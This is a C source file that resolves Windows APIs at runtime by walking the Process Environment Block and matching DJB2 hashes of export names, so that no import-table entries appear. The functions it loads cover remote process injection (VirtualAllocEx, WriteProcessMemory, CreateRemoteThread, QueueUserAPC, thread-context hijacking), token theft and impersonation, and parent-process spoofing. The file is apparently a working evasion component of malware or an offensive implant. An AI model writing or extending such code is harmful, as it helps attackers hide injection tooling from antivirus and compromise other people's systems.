/*
 * api_resolve.c — Runtime API resolution via DJB2 hash + PEB walk (x64)
 *
 * No import-table entries are generated for any function resolved here.
 * api_init() must be called once at startup before any redirected API is used.
 */

#include "api_resolve.h"
#include <stdint.h>

/* =========================================================================
 * Global function-pointer storage (definitions — externs declared in .h)
 * ========================================================================= */

FP_VirtualAllocEx                _r_VirtualAllocEx                = NULL;
FP_VirtualProtectEx              _r_VirtualProtectEx              = NULL;
FP_VirtualProtect                _r_VirtualProtect                = NULL;
FP_WriteProcessMemory            _r_WriteProcessMemory            = NULL;
FP_CreateRemoteThread            _r_CreateRemoteThread            = NULL;
FP_OpenProcess                   _r_OpenProcess                   = NULL;
FP_OpenThread                    _r_OpenThread                    = NULL;
FP_QueueUserAPC                  _r_QueueUserAPC                  = NULL;
FP_CreateToolhelp32Snapshot      _r_CreateToolhelp32Snapshot      = NULL;
FP_Thread32First                 _r_Thread32First                 = NULL;
FP_Thread32Next                  _r_Thread32Next                  = NULL;
FP_Process32First                _r_Process32First                = NULL;
FP_Process32Next                 _r_Process32Next                 = NULL;
FP_OpenProcessToken              _r_OpenProcessToken              = NULL;
FP_DuplicateTokenEx              _r_DuplicateTokenEx              = NULL;
FP_ImpersonateLoggedOnUser       _r_ImpersonateLoggedOnUser       = NULL;
FP_RevertToSelf                  _r_RevertToSelf                  = NULL;
FP_AdjustTokenPrivileges         _r_AdjustTokenPrivileges         = NULL;
FP_LookupPrivilegeValueA         _r_LookupPrivilegeValueA         = NULL;
FP_LogonUserW                    _r_LogonUserW                    = NULL;
FP_GetCurrentProcess             _r_GetCurrentProcess             = NULL;
FP_GetCurrentProcessId           _r_GetCurrentProcessId           = NULL;
FP_GetCurrentThreadId            _r_GetCurrentThreadId            = NULL;
FP_CloseHandle                   _r_CloseHandle                   = NULL;
FP_HeapAlloc                     _r_HeapAlloc                     = NULL;
FP_HeapFree                      _r_HeapFree                      = NULL;
FP_GetProcessHeap                _r_GetProcessHeap                = NULL;
FP_InitializeProcThreadAttributeList _r_InitializeProcThreadAttributeList = NULL;
FP_UpdateProcThreadAttribute     _r_UpdateProcThreadAttribute     = NULL;
FP_DeleteProcThreadAttributeList _r_DeleteProcThreadAttributeList = NULL;
FP_CreateProcessW                _r_CreateProcessW                = NULL;
FP_ResumeThread                  _r_ResumeThread                  = NULL;
FP_GetThreadContext              _r_GetThreadContext              = NULL;
FP_SetThreadContext              _r_SetThreadContext              = NULL;
FP_GetModuleHandleW              _r_GetModuleHandleW              = NULL;

/* =========================================================================
 * DJB2 hash of a null-terminated byte string (case-sensitive)
 * h = ((h << 5) + h) ^ c, starting at 5381, wrapping at 32 bits
 * ========================================================================= */
static uint32_t djb2_hash(const char *s) {
    uint32_t h = 5381u;
    while (*s) {
        h = ((h << 5) + h) ^ (uint32_t)(unsigned char)*s++;
    }
    return h;
}

/* =========================================================================
 * Retrieve the Process Environment Block via GS:[0x60] (x64)
 * ========================================================================= */
static void *peb_get(void) {
    void *peb = NULL;
    __asm__ volatile("movq %%gs:0x60, %0" : "=r"(peb));
    return peb;
}

/* =========================================================================
 * Walk a module's export directory.
 *
 * Returns the resolved function address, or NULL if:
 *  - base is NULL or has invalid DOS/NT signatures
 *  - the function hash is not found
 *  - every matching entry is a forwarder (RVA within the export directory)
 * ========================================================================= */
static void *get_export(void *base, uint32_t fn_hash) {
    if (!base) return NULL;

    IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS64 *nt =
        (IMAGE_NT_HEADERS64*)((uint8_t*)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_DATA_DIRECTORY *exp_dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exp_dir->VirtualAddress || !exp_dir->Size) return NULL;

    IMAGE_EXPORT_DIRECTORY *exp =
        (IMAGE_EXPORT_DIRECTORY*)((uint8_t*)base + exp_dir->VirtualAddress);

    DWORD *names    = (DWORD*)((uint8_t*)base + exp->AddressOfNames);
    WORD  *ordinals = (WORD* )((uint8_t*)base + exp->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD*)((uint8_t*)base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char*)((uint8_t*)base + names[i]);
        if (djb2_hash(name) != fn_hash) continue;

        DWORD fn_rva = funcs[ordinals[i]];

        /* Forwarder check: RVA falls inside the export directory itself */
        if (fn_rva >= exp_dir->VirtualAddress &&
            fn_rva <  exp_dir->VirtualAddress + exp_dir->Size) {
            continue; /* forwarder string — skip, keep looking */
        }

        return (uint8_t*)base + fn_rva;
    }
    return NULL;
}

/* =========================================================================
 * Search all modules currently loaded in the PEB's InLoadOrderModuleList
 * and return the first non-forwarder export matching fn_hash.
 *
 * Many functions (e.g. OpenProcess) forward from kernel32.dll to
 * kernelbase.dll on Windows 10+.  Iterating all modules and skipping
 * forwarders finds the real implementation regardless of where it lives.
 * ========================================================================= */
static void *resolve_fn(uint32_t fn_hash) {
    void *peb = peb_get();
    if (!peb) return NULL;

    /* PEB.Ldr at offset 0x18 */
    void *ldr = *(void**)((uint8_t*)peb + 0x18);
    if (!ldr) return NULL;

    /* PEB_LDR_DATA.InLoadOrderModuleList head at Ldr+0x10 */
    LIST_ENTRY *head  = (LIST_ENTRY*)((uint8_t*)ldr + 0x10);
    LIST_ENTRY *entry = head->Flink;

    while (entry && entry != head) {
        /* LDR_DATA_TABLE_ENTRY.DllBase at offset 0x30 */
        void *dll_base = *(void**)((uint8_t*)entry + 0x30);

        void *addr = get_export(dll_base, fn_hash);
        if (addr) return addr;

        entry = entry->Flink;
    }
    return NULL;
}

/* =========================================================================
 * api_init — resolve every function pointer.  Call once before using any
 * redirected API (e.g. as the very first line of WinMain / DllMain).
 * ========================================================================= */
void api_init(void) {
    _r_VirtualAllocEx           = (FP_VirtualAllocEx)           resolve_fn(H_VirtualAllocEx);
    _r_VirtualProtectEx         = (FP_VirtualProtectEx)         resolve_fn(H_VirtualProtectEx);
    _r_VirtualProtect           = (FP_VirtualProtect)           resolve_fn(H_VirtualProtect);
    _r_WriteProcessMemory       = (FP_WriteProcessMemory)       resolve_fn(H_WriteProcessMemory);
    _r_CreateRemoteThread       = (FP_CreateRemoteThread)       resolve_fn(H_CreateRemoteThread);
    _r_OpenProcess              = (FP_OpenProcess)              resolve_fn(H_OpenProcess);
    _r_OpenThread               = (FP_OpenThread)               resolve_fn(H_OpenThread);
    _r_QueueUserAPC             = (FP_QueueUserAPC)             resolve_fn(H_QueueUserAPC);
    _r_CreateToolhelp32Snapshot = (FP_CreateToolhelp32Snapshot) resolve_fn(H_CreateToolhelp32Snapshot);
    _r_Thread32First            = (FP_Thread32First)            resolve_fn(H_Thread32First);
    _r_Thread32Next             = (FP_Thread32Next)             resolve_fn(H_Thread32Next);
    _r_Process32First           = (FP_Process32First)           resolve_fn(H_Process32First);
    _r_Process32Next            = (FP_Process32Next)            resolve_fn(H_Process32Next);
    _r_OpenProcessToken         = (FP_OpenProcessToken)         resolve_fn(H_OpenProcessToken);
    _r_DuplicateTokenEx         = (FP_DuplicateTokenEx)         resolve_fn(H_DuplicateTokenEx);
    _r_ImpersonateLoggedOnUser  = (FP_ImpersonateLoggedOnUser)  resolve_fn(H_ImpersonateLoggedOnUser);
    _r_RevertToSelf             = (FP_RevertToSelf)             resolve_fn(H_RevertToSelf);
    _r_AdjustTokenPrivileges    = (FP_AdjustTokenPrivileges)    resolve_fn(H_AdjustTokenPrivileges);
    _r_LookupPrivilegeValueA    = (FP_LookupPrivilegeValueA)    resolve_fn(H_LookupPrivilegeValueA);
    _r_LogonUserW               = (FP_LogonUserW)               resolve_fn(H_LogonUserW);
    _r_GetCurrentProcess        = (FP_GetCurrentProcess)        resolve_fn(H_GetCurrentProcess);
    _r_GetCurrentProcessId      = (FP_GetCurrentProcessId)      resolve_fn(H_GetCurrentProcessId);
    _r_GetCurrentThreadId       = (FP_GetCurrentThreadId)       resolve_fn(H_GetCurrentThreadId);
    _r_CloseHandle              = (FP_CloseHandle)              resolve_fn(H_CloseHandle);
    _r_HeapAlloc                = (FP_HeapAlloc)                resolve_fn(H_HeapAlloc);
    _r_HeapFree                 = (FP_HeapFree)                 resolve_fn(H_HeapFree);
    _r_GetProcessHeap           = (FP_GetProcessHeap)           resolve_fn(H_GetProcessHeap);
    _r_InitializeProcThreadAttributeList =
        (FP_InitializeProcThreadAttributeList)
        resolve_fn(H_InitializeProcThreadAttributeList);
    _r_UpdateProcThreadAttribute =
        (FP_UpdateProcThreadAttribute)
        resolve_fn(H_UpdateProcThreadAttribute);
    _r_DeleteProcThreadAttributeList =
        (FP_DeleteProcThreadAttributeList)
        resolve_fn(H_DeleteProcThreadAttributeList);
    _r_CreateProcessW           = (FP_CreateProcessW)           resolve_fn(H_CreateProcessW);
    _r_ResumeThread             = (FP_ResumeThread)             resolve_fn(H_ResumeThread);
    _r_GetThreadContext         = (FP_GetThreadContext)         resolve_fn(H_GetThreadContext);
    _r_SetThreadContext         = (FP_SetThreadContext)         resolve_fn(H_SetThreadContext);
    _r_GetModuleHandleW         = (FP_GetModuleHandleW)         resolve_fn(H_GetModuleHandleW);
}
